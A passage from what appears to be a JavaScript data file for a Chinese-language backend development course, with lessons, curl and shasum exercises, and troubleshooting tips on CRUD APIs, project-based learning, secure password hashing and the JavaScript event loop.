      { title: '为什么做项目比看教程重要 10 倍', content: '认知心理学里的"生成效应"：自己动手生成的内容比被动接收的内容记忆深刻得多。\n\n教程给你的是"点"——孤立的知识碎片：\n- 这篇教你怎么定义变量\n- 那篇教你怎么用 if 语句\n- 下篇教你怎么发 HTTP 请求\n\n做项目把这些点连成"网"：\n- 定义一个变量 → 从数据库查出来赋值 → 用 if 判断是否为空 → 发给前端\n- 你会发现"原来这些知识点是这么配合的"\n\n做项目让你遇到教程里不会有的东西：\n1) 真实错误信息——"segmentation fault" "cannot read property of undefined" "deadlock detected"\n2) 工具链问题——环境配置、依赖冲突、版本兼容\n3) 设计决策——表怎么设计？API 怎么拆分？三层还是两层？\n4) 调试技巧——遇到 bug 怎么缩小范围、怎么打 log、怎么二分法定位\n\n这些东西构成了 80% 的实际工作内容。面试官问的不是"你看了什么教程"，而是"你做了什么项目，遇到什么问题，怎么解决的"。' },
      { title: '渐进式项目学习路线（4 个 Level）', content: 'Level 1 — 命令行工具（1-2 周）：\n- Todo List CLI（添加/完成/列表/删除）\n- 文件批量重命名工具（按规则批量改名）\n- 天气查询（调第三方 API，解析 JSON，输出格式化文本）\n目标：熟悉语言基本语法、标准库、文件操作\n\nLevel 2 — CRUD Web 应用（2-4 周）：\n- 博客系统（文章的增删改查+分类标签）\n- 记账 API（记一笔账、按月查、统计汇总）\n- 收藏夹（收藏 URL、标签、搜索）\n目标：学会 HTTP API 设计、数据库操作、JSON 序列化\n\nLevel 3 — 完整后端（4-8 周）：\n- 多人博客平台（用户注册登录、发表文章、评论、点赞）\n- 简单电商后台（商品管理、订单、库存）\n- 任务看板（类似简化版 Trello）\n目标：掌握认证授权、复杂 CRUD、中间件、错误处理\n\nLevel 4 — 生产化（后续持续）：\n- 加入缓存（Redis）\n- 加入文件上传（本地/云存储）\n- 加入 Docker 部署\n- 加入 CI/CD\n- 加入 API 文档（Swagger/OpenAPI）\n目标：让项目从"能用"变成"能上线"的状态' },
      { title: '"精通"的定义——不要骗自己', content: '什么叫"精通一门语言"？不是看完了官方文档，不是刷完了 LeetCode，而是：\n\n1) 能不用查资料写出该语言的 CRUD API（路由 → 参数校验 → 数据库操作 → 返回响应）\n2) 能读懂该语言主流框架的源码中的任意一个模块\n3) 能解释该语言的内存模型/并发模型的原理（如 Go 的 goroutine 调度、Node.js 的 Event Loop）\n4) 能对该语言项目的性能瓶颈做 profiling 并优化\n\n达到第 1 级 = 可以找工作了。达到第 2-3 级 = 高级工程师。达到第 4 级 = 专家。\n\n作为新手，先追求第 1 级——能独立完成项目。后续在工作中逐步达到更高水平。' },
    ],
    diagnosis: [
      { symptom: '看了 5 本书、10 个视频教程，但打开 IDE 不知道从哪开始写', cause: '输入过多输出为零——被动接收知识无法转化为编程能力。', fix: '1) 每天至少写 30 分钟代码 2) 从最小的练手项目开始：CLI Todo -> CRUD API -> 博客系统 3) 遇到不会的直接查，不等学完再写。' },
      { symptom: '项目写到一半卡住了，一个 bug 搞了 3 天没进展', cause: '没有调试方法论——靠随机修改代码碰运气而非系统性排查。', fix: '1) 二分法定位：注释掉一半代码缩小范围 2) 最小可复现：把问题隔离到 20 行代码内 3) 30 分钟解不出来就问 AI/社区。' },
    ],
    exercises: [
      { level: '基础', task: '规划你的第一个后端项目——写出项目名称、3 个核心功能、用到的技术栈', hint: '从你日常生活中选一个场景', answer: '例如"个人阅读记录 API"：功能 1) POST /books 记录一本书（书名+作者+阅读状态）2) GET /books?status=reading 筛选正在读的书 3) GET /stats 统计（本月读完 3 本、在读 2 本）。技术栈：Go + SQLite + 标准库 net/http。' },
      { level: '进阶', task: '做个"30 天项目挑战"计划：连续 30 天，每天至少写 30 分钟代码，记录每天的进度和遇到的问题', hint: '用 GitHub 的 Contribution 绿格子作为打卡工具', answer: '创建一个 GitHub 仓库记录每天的进展。Day 1：项目初始化+数据库设计。Day 2-5：实现 CRUD 接口。Day 6-8：加入用户认证。Day 9-12：写前端简单页面。Day 13-15：部署上线。30 天结束后你会发现自己进步巨大。' },
    ],
  },

  // ============================================================
  // 17. Beginner Project Ideas / 初级项目
  // ============================================================
  "cQUhtRHvkSaYbb40jWho_": {
    mentalModel: '初级项目就像学骑车时的辅助轮——别嫌简单，把基础动作练到肌肉记忆，后面才能放开跑。CRUD（Create/Read/Update/Delete）就是后端的"听说读写"——把这两下子练熟，你已经能胜任 60% 的后端工作了。',
    sections: [
      { title: 'CRUD 深度拆解——每个字母后面的实现细节', content: 'C — Create（创建）\n- 路由：POST /resource\n- 请求体包含新资源的所有字段\n- 后端职责：校验字段（必填/类型/长度/业务规则）、防 SQL 注入（参数化查询）、生成 ID（自增/UUID/雪花 ID）、返回 201 Created + 新资源\n\nR — Read（读取）\n- 路由：GET /resource 列表、GET /resource/:id 详情\n- 查询参数：?page=1&limit=20 分页、?sort=created_at&order=desc 排序、?keyword=xxx 搜索\n- 后端职责：构建 WHERE 条件（动态查询）、LIMIT/OFFSET 分页、返回 total 总数供前端计算页数\n\nU — Update（更新）\n- 路由：PUT /resource/:id 全量替换、PATCH /resource/:id 部分更新\n- PUT 需要传所有字段（缺了就被清空！），PATCH 只传要改的字段\n- 后端职责：查资源是否存在（不存在 404）、权限检查（只能改自己的）、乐观锁防并发冲突（version 字段）\n\nD — Delete（删除）\n- 路由：DELETE /resource/:id\n- 软删除 vs 硬删除：软删除=设置 deleted_at 字段（可恢复），硬删除=真删（不可恢复）\n- 后端职责：检查关联数据（删用户时他的文章怎么处理？）、返回 204 No Content\n\n一首打油诗帮助记忆：Get 来查 Post 来建，Put 全改 Patch 部分变。Delete 删除要小心，204 No Content 别忘记。' },
      { title: '三个经典初级项目方案（可直接动手）', content: '项目 1：Todo API（1-2 天）\n- 数据模型：{id, title, completed, created_at}\n- API：GET /todos、POST /todos、PUT /todos/:id、DELETE /todos/:id\n- 进阶：加分类标签、加截止日期、加排序\n\n项目 2：个人博客 API（3-5 天）\n- 数据模型：Post {id, title, content, category, created_at}、Category {id, name}\n- API：CRUD posts + CRUD categories + 按分类筛选 + 关键词搜索\n- 进阶：加 Markdown 渲染、加文章草稿/发布状态\n\n项目 3：通讯录 API（2-3 天）\n- 数据模型：Contact {id, name, phone, email, group, created_at}、Group {id, name}\n- API：CRUD contacts + CRUD groups + 按分组筛选 + 按姓名/电话搜索\n- 进阶：导入 vCard 格式、去重检查、批量删除' },
    ],
    handsOn: [
      { title: '用 curl 完整测试一套 CRUD API', cmd: `# 假设 API 运行在 localhost:3000
# CREATE
curl -s -X POST http://localhost:3000/todos \
  -H "Content-Type: application/json" \
  -d '{"title":"学后端","completed":false}'
# READ (列表)
curl -s http://localhost:3000/todos
# UPDATE
curl -s -X PATCH http://localhost:3000/todos/1 \
  -H "Content-Type: application/json" \
  -d '{"completed":true}'
# DELETE
curl -s -X DELETE http://localhost:3000/todos/1`, output: '{"id":1,"title":"学后端","completed":false}\n[{"id":1,...}]\n{"id":1,"title":"学后端","completed":true}\n(204 空响应)', explain: '这四个命令覆盖了完整的 CRUD 流程。实际开发中，每次写完一个接口就像这样用 curl 快速验证。养成写完代码立刻 curl 测试的习惯，而不是等前端联调才发现问题。' },
    ],
    diagnosis: [
      { symptom: 'POST 创建资源成功但 GET 列表里查不到', cause: '可能是事务没提交（忘写 COMMIT）、数据写到了另一个库/表、或列表查询的条件过滤掉了新数据。', fix: '1) 直接在数据库客户端查表确认数据是否写入 2) 检查是否开启了事务未提交 3) 检查 GET 列表的查询条件是否有 WHERE 误过滤 4) 检查数据库连接字符串是否指向同一个库。' },
      { symptom: 'DELETE 返回 200 但数据还在', cause: '代码中逻辑错误——可能是软删除标记了但列表查询没过滤 deleted 记录，或者 DELETE 语句的 WHERE 条件没匹配到。', fix: '1) 检查 SQL DELETE 语句的 WHERE 条件是否正确 2) 如果是 ORM，检查是否误用了 update 而非 delete 3) 如果是软删除，检查列表查询是否加了 WHERE deleted_at IS NULL。' },
    ],
    exercises: [
      { level: '基础', task: '设计一个"书架管理"API 的 URL 和方法（5 个端点）', hint: '列表/详情/新增/更新/删除 + RESTful URL', answer: 'GET /books（列表，支持 ?status=reading&sort=title 查询参数）、GET /books/:id（详情）、POST /books（新增）、PUT /books/:id（更新）、DELETE /books/:id（删除）。这是 REST 标准 CRUD 路由，任何资源都适用这个模式。' },
      { level: '进阶', task: '在你选的框架中实现完整的 Todo API，包含所有 CRUD 操作、参数校验、错误处理，并用 curl 逐个测试', hint: '选择一个框架：Express/FastAPI/Gin/Spring Boot，从头实现', answer: '实现要点：1) 用数组或数据库存储数据 2) POST 时校验 title 不能为空 3) 操作不存在的 ID 返回 404 4) 错误用统一格式 {"error": "message"} 返回。用 curl 测试每种情况（正常/参数缺失/ID不存在）。这一步就是后端日常开发的核心循环。' },
    ],
  },

  // ============================================================
  // 18. Intermediate Project Ideas / 中级项目
  // ============================================================
  "pBAPWRos4jspRkdKkU0-M": {
    mentalModel: '中级项目就是给你的 CRUD"毛坯房"装修并通水电——加入认证（门禁系统）、缓存（常用物品放在手边）、日志监控（安防摄像头）、部署上线（从工地搬到可入住的房子），让它从"能住人"变成"能舒适地住人"。',
    sections: [
      { title: '中级项目 vs 初级项目的区别——从 Demo 到 Product', content: '初级项目的特征：\n- 没有用户系统（所有人看到一样的数据）\n- 没有鉴权（知道 URL 就能操作任何数据）\n- 没有分页（一次性返回所有数据，1000 条就崩了）\n- 没有缓存（每次请求都查数据库）\n- 没有日志/监控（出错了只能看控制台）\n- 没有部署（只有 localhost 能访问）\n\n中级项目必须加的 7 样东西：\n\n1) 用户注册/登录（JWT 或 Session 认证）\n2) 权限控制（普通用户 vs 管理员 / 只能改自己的数据）\n3) 分页+搜索+排序（应对大数据量）\n4) 数据校验（不仅是"不为空"，还有格式/长度/业务规则）\n5) 缓存层（Redis 缓存热点数据，减少数据库压力）\n6) 日志和错误处理（统一的错误格式、请求日志、错误追踪）\n7) Docker 部署（一键在任何机器上跑起来）\n\n这些加完之后，你的项目从一个"玩具"变成了一个"产品雏形"——可以放简历上展示。' },
      { title: '中级项目推荐方案（4 选 1）', content: '方案 A：多人博客平台（适合 2-4 周）\n功能：用户注册登录（JWT）、文章 CRUD（作者只能改自己的）、分类标签、评论（嵌套评论）、点赞、Markdown 渲染、全文搜索、访问统计\n技术点：认证+授权、一对多/多对多关系、数据聚合、权限检查\n\n方案 B：简易任务管理系统（适合 2-3 周）\n功能：看板→列表→卡片三级结构、拖拽排序（前端实现，后端记录位置）、成员分配、到期提醒、操作日志\n技术点：层级数据模型、批量排序更新、定时任务、数据审计\n\n方案 C：电商后台管理（适合 3-4 周）\n功能：商品管理（多图/SKU）、订单管理（创建→支付→发货→完成状态流转）、库存扣减（防超卖）、数据统计看板\n技术点：状态机设计、并发扣库存（乐观锁/悲观锁）、事务管理、数据聚合\n\n方案 D：API 网关简化版（适合 2-3 周，偏基础设施）\n功能：路由转发（根据路径代理到不同后端）、限流（令牌桶/滑动窗口）、认证（验证 JWT 并注入 Header）、简单日志\n技术点：反向代理、中间件链、限流算法、HTTP 请求处理' },
      { title: '中级项目必踩的坑和学到的东西', content: '做中级项目时你一定会遇到这些问题——这些才是有价值的学习：\n\n1) "为什么用户 A 能看到用户 B 的数据？" → 发现你忘了在查询时加 WHERE user_id = 当前用户。学会：每层都要做权限检查，不信任前端传的 user_id。\n\n2) "两个用户同时买最后一件商品，库存变成 -1 了" → 发现并发问题。学会：悲观锁（SELECT FOR UPDATE）、乐观锁（version 字段+重试）、Redis 原子操作（DECR）。\n\n3) "生产环境报错了但看不到日志" → 发现没做日志收集。学会：结构化日志（JSON 格式）、日志级别（DEBUG/INFO/WARN/ERROR）、集中式日志（ELK/Loki）。\n\n4) "部署后数据库密码写在代码里" → 发现安全问题。学会：环境变量（.env）、配置管理、密钥管理（Secrets Manager/Vault）。\n\n这些才是中级项目的真正价值——不是功能多，而是你对"软件质量"的理解提升了一个层次。' },
    ],
    diagnosis: [
      { symptom: '上线后发现用户 A 的数据出现在了用户 B 的页面上', cause: '查询时没有用当前用户 ID 过滤——SELECT * FROM orders 而非 WHERE user_id = ?。', fix: '1) 所有涉及用户数据的查询必须加 user_id 过滤 2) 在中间件层统一注入当前用户 ID 3) 写集成测试覆盖用户 A 不能看到用户 B 的数据。' },
      { symptom: '两个用户同时买最后一件商品，库存变成 -1', cause: '并发超卖——没有在并发场景下保证库存扣减的原子性。', fix: '1) 数据库：UPDATE products SET stock = stock - 1 WHERE id = ? AND stock >= 1，检查 affected_rows 2) Redis DECR 原子操作 3) 悲观锁 SELECT FOR UPDATE。' },
      { symptom: '部署后 API 返回 500，但本地 localhost 一切正常', cause: '环境差异——数据库连接串硬编码、文件路径不同、环境变量缺失。', fix: '1) 所有配置走环境变量 2) 用 Docker 确保环境一致性 3) 加结构化日志记录启动时的关键配置 4) 加 /health 端点检查数据库连接。' },
    ],
    exercises: [
      { level: '基础', task: '为一个博客系统设计完整的数据库 ER 图：用户表、文章表、评论表、标签表、文章-标签关联表', hint: '一对一、一对多、多对多关系', answer: 'users(id, username, email, password_hash)。posts(id, title, content, user_id FK, status, created_at)。comments(id, content, post_id FK, user_id FK, parent_id FK(自引用，嵌套评论))。tags(id, name)。post_tags(post_id FK, tag_id FK, 联合主键)。' },
      { level: '进阶', task: '为"商品下单"操作设计防超卖的方案：用户 A 和 B 同时买最后一件库存为 1 的商品，如何保证只有一人成功？', hint: '乐观锁（WHERE stock > 0）+ 数据库事务', answer: '方案 1（推荐）：UPDATE products SET stock = stock - 1 WHERE id = 123 AND stock >= 1。检查 affected_rows，如果为 0 说明库存不足。方案 2：Redis DECR stock:123，如果结果 >= 0 则成功，< 0 则回滚（INCR 补回）。方案 3：悲观锁 SELECT stock FROM products WHERE id = 123 FOR UPDATE，在事务中先锁行再扣库存。' },
      { level: '挑战', task: '在你的中级项目中实现完整的"请求经过的每一层"日志追踪：每个请求生成一个 requestId，经过的所有中间件/处理函数/数据库查询都带上这个 ID，方便排错', hint: '用 middleware 生成 UUID 注入 context/req 对象', answer: '1) 第一个中间件：生成 UUID → 存入 ctx/req.logger → 设置响应头 X-Request-Id 2) 所有后续日志输出格式：[requestId] [时间] [级别] 消息 3) 日志中包含：method、path、status_code、duration_ms。查问题时 grep 这个 requestId 就看到完整调用链。这是生产环境排障的基础设施。' },
    ],
  },

  // ============================================================
  // 19. Hashing Algorithms / 哈希算法
  // ============================================================
  "Ms0TfvSRA1z7NGJAQhdqy": {
    mentalModel: '哈希就像把一整本书扔进一台"碎纸机+压缩器"——出来的是一小段固定长度的纸屑（哈希值）。你永远没法从纸屑还原那本书，但如果同一本书再扔一次，出来的纸屑完全一样。密码哈希就是你设置的密码"碎成了纸屑"存起来，即使数据库泄露，攻击者也拼不回原始密码。',
    sections: [
      { title: '哈希的三条铁律——理解哈希的本质', content: '铁律 1：确定性——同样输入永远产生同样输出\nSHA256("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\n无论你算多少次，结果都一样。这个特性让哈希可以用于"完整性校验"——下载文件后算哈希，和官方公布的对比，一致就说明文件没被篡改。\n\n铁律 2：单向性——不能从哈希值反推出原始输入\n只有一种方法：暴力穷举。SHA256("hello") 很快算出来，但从哈希值猜"hello"只能一个个字测试。这就是密码存储的安全基础。\n\n铁律 3：雪崩效应——改动一点点，结果完全不同\nSHA256("hello") 和 SHA256("Hello")（只改了大写 H），结果天差地别。这确保了不能从相近输出推测相近输入。\n\n注意：哈希不等于加密！\n- 加密：可逆的（有密钥就能解密）——用于传输（HTTPS）、存储（加密文件）\n- 哈希：不可逆的——用于验证（密码）、校验（文件完整性）、索引（HashMap）' },
      { title: '密码哈希——为什么 SHA256 不够用', content: '如果你用 SHA256 存密码，攻击者拿到数据库后这样做：\n\n1) 准备"彩虹表"（Rainbow Table）：预先计算常见密码的 SHA256 值\n   SHA256("123456") = 8d969eef...\n   SHA256("password") = 5e884898...\n   SHA256("iloveyou") = e4ad93ca...\n   ...（上亿条常见密码）\n\n2) 把数据库里的哈希值在彩虹表里查：啪！瞬间破解所有弱密码。\n\n所以需要专门为密码设计的哈希算法——它们故意"慢"且"贵"：\n\nbcrypt（1999，久经考验）：\n- 内置盐（Salt）：自动为每个密码加随机盐，同样密码不同用户哈希结果不同\n- Cost Factor：可调节的"变慢因子"。cost=10 大约 100ms 一次哈希\n- 设计目标：让攻击者暴力破解慢到不可行（每秒只能试几次，试不了几亿次）\n\nargon2（2015，最推荐）：\n- 除了 CPU 开销，还可以设置内存开销（memory-hard）\n- GPU/ASIC 难以加速（因需要大量内存）\n- 2015 年密码哈希竞赛冠军，目前最佳选择\n\nscrypt（2009）：\n- 和 argon2 类似，也是 memory-hard\n- 比 bcrypt 更抗硬件加速攻击\n\n实际选择：新项目用 argon2id，老项目继续用 bcrypt（也足够安全）。' },
      { title: '哈希在非密码场景的广泛应用', content: '1) 数据完整性校验\n下载文件时看到 MD5/SHA256 校验值，就是用来验证文件没损坏/没被篡改。Git 的 commit hash 就是 SHA-1 哈希——每个 commit 的内容计算出唯一的 ID。\n\n2) 数据索引（HashMap / Hash Table）\n程序里的 Map/Dictionary 数据结构底层就是哈希表。通过哈希函数把 Key 映射到数组索引，O(1) 查找。\n\n3) 重复检测\n上传文件前先算文件的 SHA256，和已有文件的哈希对比，相同 = 重复文件，不用再存。Git 就这样去重存储文件。\n\n4) 区块链\n每个区块包含前一个区块的哈希，形成链式结构。任何篡改都会导致哈希对不上，链就断了。\n\n5) API 密钥存储\nAPI Key（如 sk-xxx）不应该明文存数据库。存储 sk-xxx 的 SHA256 哈希值，验证时对用户输入的 API Key 算哈希再对比。这样即使数据库泄露，攻击者拿到的只是哈希值而非真实 Key。' },
    ],
    handsOn: [
      { title: '用命令行体验哈希的雪崩效应', cmd: `echo -n "hello" | shasum -a 256
echo -n "Hello" | shasum -a 256
echo -n "hello!" | shasum -a 256`, output: '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  -\n185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969  -\nce06092fb69d2df2e28c7c7838cb6286af76e4c58c7fdc43a1d3b0854f55aead  -', explain: '三个输入只有微小差别（大小写、加符号），但输出的哈希值完全不同。这就是雪崩效应——你不能从哈希值猜到原始内容的大概形态，也不能从变动程度推测原始内容的改动程度。' },
      { title: '用 Python 体验 bcrypt 的"慢"', cmd: `python3 << 'EOF'
import time, bcrypt
password = b"mysecretpassword"
# cost factor 10
start = time.time()
hash10 = bcrypt.hashpw(password, bcrypt.gensalt(rounds=10))
t10 = time.time() - start
# cost factor 14 (慢 16 倍)
start = time.time()
hash14 = bcrypt.hashpw(password, bcrypt.gensalt(rounds=14))
t14 = time.time() - start
print(f"cost=10: {t10*1000:.0f}ms | cost=14: {t14*1000:.0f}ms")
print(f"hash: {hash10[:40]}...")
EOF`, output: 'cost=10: 95ms | cost=14: 1580ms\nhash: $2b$10$8K1p/a0dL1LXHIEg/GnY5e...', explain: 'cost 每增加 1，计算时间翻倍。cost=10 大约 100ms——对用户登录来说可以接受（只算一次），但对攻击者暴力破解来说每秒只能试 10 次，十亿次需要 3 年。cost=14 要 1.5 秒，用户体验差但更安全。生产环境 cost=10~12 是平衡点。' },
    ],
    diagnosis: [
      { symptom: '用户数据库泄露后，发现很多密码迅速被破解', cause: '使用了快速哈希（MD5/SHA256）且没有加盐，攻击者可以用彩虹表秒破弱密码。', fix: '1) 立即迁移到 bcrypt/argon2 2) 对已有用户：在下次登录时自动用新算法重新哈希（透明迁移）3) 已泄露的密码：强制所有用户重置密码。预防：永远不要自己发明密码存储方案。' },
      { symptom: '每次 bcrypt.compare() 都返回 false，但密码是对的', cause: '把 bcrypt 哈希结果再次哈希、存储/读取时截断了哈希字符串（数据库字段太短）、字符编码问题。', fix: '1) 确认数据库密码字段长度至少 60（bcrypt 输出固定 60 字符）2) 确认存储的是 bcrypt.hash 的原始输出、没有再加工 3) 确认字符编码一致（UTF-8）4) 用 bcrypt.compare(plaintext, storedHash) 验证。' },
      { symptom: '登录接口响应时间 >500ms，排查发现是 bcrypt 太慢', cause: 'cost factor 设置过高（如 14+），虽然安全但影响体验。', fix: '1) 降到 cost=10-12（100-300ms，生产环境标准）2) 如果确实需要高 cost，将密码验证移到后台异步处理或使用硬件加速 3) 检测到暴力破解时动态提高 cost 作为防御。' },
    ],
    exercises: [
      { level: '基础', task: '用命令行工具计算字符串"hello world"的 MD5、SHA1、SHA256 三种哈希值，对比长度差异', hint: 'echo -n "hello world" | md5sum / shasum -a 1 / shasum -a 256', answer: 'MD5: 5eb63bbbe01eeed093cb22bb8f5acdc3（32字符）SHA1: 2aae6c35c94fcfb415dbe95f408b9ce91ee846ed（40字符）SHA256: b94d27b9...（64字符）。越长越安全（抗碰撞）。MD5 已完全不建议用于安全场景。' },
      { level: '进阶', task: '在你的项目中使用 bcrypt 实现密码哈希：注册时哈希存储，登录时验证。写出完整代码', hint: '注册：const hash = await bcrypt.hash(password, 10); 登录：const match = await bcrypt.compare(inputPassword, user.passwordHash);', answer: 'Node.js: bcrypt.hash(password, 10) 返回 $2b$10$... 格式的哈希，存入数据库。登录时 bcrypt.compare(input, storedHash) 返回 true/false。bcrypt 的盐自动包含在输出中，不需要单独存储。Python: bcrypt.hashpw(password.encode(), bcrypt.gensalt(10))。' },
      { level: '挑战', task: '研究一下"定时攻击"（Timing Attack）——为什么密码比较不能用 === 或 == ？实现一个常量时间比较函数', hint: '普通字符串比较逐字符比较，第一个不同就返回 false。攻击者可以测量时间差异逐字符猜测', answer: '=== 会在第一个不匹配字符处立即返回，时间差暴露了正确的前缀长度。攻击者反复尝试可以逐字符猜出密码。防御：常量时间比较——遍历完所有字符再返回结果。Node.js: crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))。Python: hmac.compare_digest(a, b)。注意：bcrypt.compare 内部已经做了常量时间比较，不需要额外处理。' },
    ],
  },

  // ============================================================
  // 20. JavaScript / 浏览器脚本（Node.js 视角）
  // ============================================================
  "8-lO-v6jCYYoklEJXULxN": {
    mentalModel: 'JavaScript 是浏览器里的"操作系统"——它控制页面的一切动态行为。后端学 JS 不是为了写炫酷的前端动画，而是为了理解"前端的请求是怎么发出来的、数据是怎么处理的"。掌握浏览器 JS 等于打通了前后端联调的"任督二脉"。',
    sections: [
      { title: '后端必懂的 JavaScript 核心概念', content: '1) 异步（Async/Await/Promise）：\n   JS 是单线程的，不能阻塞等结果。fetch(url) 返回一个 Promise——一个"未来会得到结果的承诺"。\n   await fetch(url) 暂停当前函数等结果，但不阻塞主线程。\n   理解异步是理解前端 HTTP 请求的关键——你后端写的是同步代码（等数据库返回），但前端所有操作都得是异步的。\n\n2) JSON：前后端的"通用语言"\n   JSON.stringify(obj) → 把 JS 对象变成 JSON 字符串（发送给后端）\n   JSON.parse(str) → 把 JSON 字符串变成 JS 对象（处理后端返回）\n   注意：JSON 不支持 Date、undefined、函数——Date 会被转成字符串，后端返回日期时用 ISO 8601 格式。\n\n3) fetch API：前端发 HTTP 请求的标准方式\n   const res = await fetch("/api/users");\n   const data = await res.json();  // 解析 JSON body\n   等价于你后端用 curl——但理解"前端居然做了两次 await" 对排查问题很重要\n\n4) DOM 操作：\n   document.querySelector("#btn") — 选中元素\n   element.addEventListener("click", fn) — 绑定事件\n   后端不需要写，但要能读懂——至少能看懂前端代码中按钮点击后触发的是哪个 API 调用' },
      { title: 'Node.js 与浏览器 JS——相同语言，不同世界', content: '相同的部分（ECMAScript 标准）：\n- 变量声明：let/const\n- 箭头函数：() => {}\n- 解构赋值：const { name, age } = user\n- Promise/async-await\n- 数组方法：map/filter/reduce/find\n- 模板字符串：`Hello ${name}`\n\n浏览器特有 API（Node.js 没有）：\n- window / document（DOM 操作）\n- fetch（Node.js 18+ 也有了！）\n- localStorage / sessionStorage\n- Web API：Geolocation、Notification、Canvas\n\nNode.js 特有 API（浏览器没有）：\n- fs（文件系统）\n- http/https（创建服务器）\n- path（路径处理）\n- process（进程信息）\n- Buffer（二进制数据处理）\n- stream（流式处理）\n\n全栈 JS 的优势：前后端用同一种语言——同一个开发者可以写 API 和调用 API 的前端代码。共享类型定义（TypeScript）、共享校验逻辑（zod/yup）、共享工具函数。这就是 Node.js 流行的核心原因。' },
      { title: 'TypeScript——给 JS 装上"安全带"', content: 'TypeScript = JavaScript + 静态类型系统。\n\n举个例子：\n// JavaScript（运行时才知道错）\nfunction add(a, b) { return a + b; }\nadd(1, "2")  // 返回 "12"（字符串拼接，不是你想要的 3）\n\n// TypeScript（编译时就报错）\nfunction add(a: number, b: number): number { return a + b; }\nadd(1, "2")  // 编译错误：Argument of type "string" is not assignable to parameter of type "number"\n\nTypeScript 的价值：\n1) 智能提示：IDE 知道每个变量的类型，自动补全、跳转定义\n2) 重构安全：改一个接口定义，所有使用的地方自动标红\n3) 自文档化：类型定义本身就是文档\n\n后端推荐：一律用 TypeScript 写 Node.js。付出的学习成本在第一个中型项目就值回来了。' },
    ],
    handsOn: [
      { title: '在 Node.js 中发送 HTTP 请求（体验前端-后端在同一语言中）', cmd: `node -e "
fetch('https://api.github.com/repos/nodejs/node')
  .then(r => r.json())
  .then(d => console.log('Node.js Stars:', d.stargazers_count))
  .catch(e => console.error('Error:', e.message))
"`, output: 'Node.js Stars: 105000+', explain: 'Node.js 18+ 内置了 fetch API（和浏览器一样）。这行代码和后端 HTTP 客户端做的事完全一样——但用的是前端熟悉的语法。这就是全栈 JS 的魅力：同一种语言写前端、写后端、写脚本。' },
    ],
    diagnosis: [
      { symptom: '前端说接口调不通，后端看日志收到了请求且返回正常', cause: 'CORS 拦截——后端返回了数据但浏览器因跨域策略不允许 JS 读取响应。', fix: '1) 前端 Console 查看 CORS 错误详情 2) 后端 Response Header 加 Access-Control-Allow-Origin 3) 如果前端用 credentials: include，Allow-Origin 不能是 *。' },
      { symptom: '前端报 undefined is not an object 但后端确认返回了 JSON', cause: 'JSON 字段名前后端不一致——后端用 snake_case（created_at），前端期望 camelCase（createdAt）。', fix: '1) 统一字段命名规范 2) 后端序列化时统一转换 3) 用 OpenAPI 文档明确定义字段名和类型。' },
    ],
    exercises: [
      { level: '基础', task: '用 Node.js 写一个脚本，读取 package.json 文件，打印项目名称和依赖数量', hint: 'const pkg = require("./package.json") 或 fs.readFileSync + JSON.parse', answer: `const pkg = require('./package.json'); console.log('项目名:', pkg.name); console.log('依赖数:', Object.keys(pkg.dependencies || {}).length);` },
      { level: '进阶', task: '用 fetch 调用一个公开 API，并用 async/await 写代码（不用 .then()），加上 try/catch 错误处理', hint: 'async function getData() { try { const res = await fetch(url); const data = await res.json(); } catch(e) {} }', answer: 'async function getUser(id) { try { const res = await fetch(`https://jsonplaceholder.typicode.com/users/${id}`); if (!res.ok) throw new Error(`HTTP ${res.status}`); return await res.json(); } catch(e) { console.error("获取用户失败:", e.message); return null; } }。注意要检查 res.ok（状态码非 2xx 时 fetch 不会抛异常）。' },
    ],
  },

  // ============================================================
  // 21. JavaScript (Event Loop 深入) / 浏览器脚本
  // ============================================================
  "An2lMuJEkkpL0cfw4RrSl": {
    mentalModel: 'JavaScript 的 Event Loop 像一个"独臂厨师"——他只有一只手（单线程），但他有个计时器（定时任务）和传菜铃（回调函数）。炒菜时不用一直盯着锅（非阻塞 I/O），定时器响了再回来翻一下。铃响了（回调就绪）就把菜端出去。这种机制让一个厨师能同时处理 20 桌客人（高并发），前提是每道菜的"等待时间"（I/O）远多于"翻炒时间"（CPU）。',
    sections: [
      { title: 'Event Loop 的完整运行机制（面试必考）', content: 'Event Loop 每轮循环（一个 Tick）的执行顺序：\n\n1) 执行一个宏任务（MacroTask）：从宏任务队列中取出最早的一个执行\n   宏任务包括：script 整体代码、setTimeout、setInterval、I/O 操作、setImmediate（Node.js）\n\n2) 清空微任务队列（MicroTask）：执行所有微任务，包括本轮中新产生的微任务！\n   微任务包括：Promise.then/catch/finally、async/await（await 后面的代码）、queueMicrotask()、MutationObserver（浏览器）、process.nextTick（Node.js，优先级最高）\n   关键：微任务会一次性全部执行完，中间不会插入宏任务\n\n3) 渲染（浏览器）/ 检查（Node.js）：\n   浏览器：如果需要，执行渲染更新（requestAnimationFrame 在这之前）\n   Node.js：检查是否有待处理的回调\n\n4) 回到步骤 1，开始新一轮\n\n经典面试题输出顺序：\nconsole.log("1");\nsetTimeout(() => console.log("2"), 0);\nPromise.resolve().then(() => console.log("3"));\nconsole.log("4");\n\n输出：1 → 4 → 3 → 2\n解释：1 和 4 是同步代码（当前宏任务），3 是微任务（在本轮宏任务结束后立即执行），2 是下一个宏任务（下一轮）。' },
      { title: '这对后端（Node.js）意味着什么', content: 'Node.js 用单线程 + Event Loop 处理所有请求。\n\n为什么 Node.js 能高并发：\n- 大部分后端操作的瓶颈是 I/O（数据库查询、文件读取、HTTP 请求），不是 CPU\n- Node.js 发起 I/O 操作后不等待，注册回调，继续处理下一个请求\n- 当 I/O 完成，回调进入队列等待执行\n- 这就是"非阻塞 I/O + 事件驱动"的精髓\n\n但有一个致命弱点——Event Loop 阻塞：\n- 如果你在请求处理函数中做了 CPU 密集操作（大 JSON 解析、图片处理、加密计算、大循环）\n- Event Loop 被占用，所有其他请求都得排队等\n- 现象：服务器没挂但所有请求超时\n\n如何避免：\n1) CPU 密集操作交给 Worker Threads（类似浏览器 Web Worker）\n2) 大数据处理用 Stream（分块读，不一次加载到内存）\n3) 拆分长计算为小块（每次算一点，用 setImmediate 让出主线程）\n4) 极端的 CPU 密集任务交给独立服务（Go/Rust）\n\nNode.js 适合：I/O 密集（API 网关、实时应用、BFF 层）\nNode.js 不适合：CPU 密集（视频转码、科学计算、大文件压缩）' },
